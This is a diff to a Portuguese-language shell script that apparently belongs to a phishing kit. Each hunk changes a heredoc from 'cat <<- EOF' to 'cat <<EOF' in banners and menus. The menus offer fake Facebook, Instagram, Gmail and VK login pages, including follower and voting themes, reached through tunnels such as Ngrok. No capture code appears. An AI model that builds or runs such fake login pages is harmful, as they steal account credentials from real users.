@@ -49,7 +49,7 @@ kill_pid() {
 
 ## Banner
 banner() {
-        cat <<- EOF
+        cat <<EOF
         
 ${ORANGE} .d8888b.  888               888 888 8888888b.  888      d8b          888      
 ${ORANGE}d88P  Y88b 888               888 888 888   Y88b 888      Y8P          888      
@@ -59,7 +59,7 @@ ${ORANGE}    "Y88b. 888 "88b d8P  Y8b 888 888 8888888P"  888 "88b 888 88K      8
 ${ORANGE}      "888 888  888 88888888 888 888 888        888  888 888 "Y8888b. 888  888 
 ${ORANGE}Y88b  d88P 8O8  8B8 Y8b.     8R8 8I8 8G8        8A8  8D8 8O8      XP8 8O8  8R8 
 ${ORANGE} "Y8U88P"  8S8  8A8  "Y8R88  8T8 8M8 8J8        8G8  8A8 8L8  88E88P' 8R8  8A8
-                                                                     ${RED}Versão : 1.0
+${ORANGE}                                                            ${RED}Versão : 1.0
 
                 ${GREEN}[${WHITE}-${GREEN}]${CYAN} Criado por Flávio Costa${WHITE}
         EOF
@@ -67,7 +67,7 @@ ${ORANGE} "Y8U88P"  8S8  8A8  "Y8R88  8T8 8M8 8J8        8G8  8A8 8L8  88E88P' 8
 
 ## Small Banner
 banner_small() {
-        cat <<- EOF
+        cat <<EOF
 ${BLUE} ,-.  .       . . ;-.  .         .   
 ${BLUE}(   ` |       | | |  ) |   o     |   
 ${BLUE} `-.  |-. ,-. | | |-'  |-. . ,-. |-. 
@@ -166,7 +166,7 @@ msg_exit() {
 ## About
 about() {
         { clear; banner; echo; }
-        cat <<- EOF
+        cat <<EOF
                 ${GREEN}Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}Flávio Costa ${RED}]
                 ${GREEN}Github   ${RED}:  ${CYAN}https://github.com/htr-tech
                 ${GREEN}Social   ${RED}:  ${CYAN}https://linktr.ee/tahmid.rayat
@@ -276,7 +276,7 @@ start_localhost() {
 ## Tunnel selection
 tunnel_menu() {
         { clear; banner_small; }
-        cat <<- EOF
+        cat <<EOF
 
                 ${RED}[${WHITE}01${RED}]${ORANGE} Localhost ${RED}[${CYAN}For Devs${RED}]
                 ${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io  ${RED}[${CYAN}Best${RED}]
@@ -297,7 +297,7 @@ tunnel_menu() {
 
 ## Facebook
 site_facebook() {
-        cat <<- EOF
+        cat <<EOF
 
                 ${RED}[${WHITE}01${RED}]${ORANGE} Página de login tradicional
                 ${RED}[${WHITE}02${RED}]${ORANGE} Pàgina de login da votação avançada
@@ -332,7 +332,7 @@ site_facebook() {
 
 ## Instagram
 site_instagram() {
-        cat <<- EOF
+        cat <<EOF
 
                 ${RED}[${WHITE}01${RED}]${ORANGE} Página de login tradicional
                 ${RED}[${WHITE}02${RED}]${ORANGE} Página de login de seguidores automáticos
@@ -367,7 +367,7 @@ site_instagram() {
 
 ## Gmail/Google
 site_gmail() {
-        cat <<- EOF
+        cat <<EOF
 
                 ${RED}[${WHITE}01${RED}]${ORANGE} Página de login do Gmail antigona
                 ${RED}[${WHITE}02${RED}]${ORANGE} Página de login do Gmail nova
@@ -397,7 +397,7 @@ site_gmail() {
 
 ## Vk
 site_vk() {
-        cat <<- EOF
+        cat <<EOF
 
                 ${RED}[${WHITE}01${RED}]${ORANGE} Página de login tradicional
                 ${RED}[${WHITE}02${RED}]${ORANGE} Página de login de Votação avançada
@@ -423,7 +423,7 @@ site_vk() {
 ## Menu
 main_menu() {
         { clear; banner; echo; }
-        cat <<- EOF
+        cat <<EOF
                 ${RED}[${WHITE}::${RED}]${ORANGE} "Pick up your weapons and fight! Vamos de quê hoje?" ${RED}[${WHITE}::${RED}]${ORANGE}
 
                 ${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
